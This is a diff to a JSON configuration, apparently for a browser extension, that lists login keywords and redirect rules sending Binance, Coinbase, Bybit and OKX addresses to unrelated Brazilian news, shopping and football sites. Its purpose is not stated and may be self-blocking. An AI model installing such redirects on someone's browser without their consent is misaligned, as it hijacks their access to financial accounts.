@@ -18,7 +18,7 @@
     "login", "loguin", "sign in", "entrar"
   ],
   "redirectRules": [
-    {"regex": "(www\\.)?binance\\.(com|us).*", "url": "https://americanas.com.br/"},
+    {"regex": "(www\\.)?binance\\.(com|us).*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?coinbase\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?bybit\\.com.*", "url": "https://americanas.com.br/"},
     {"regex": "(www\\.)?okx\\.com.*", "url": "https://flamengo.com/"},
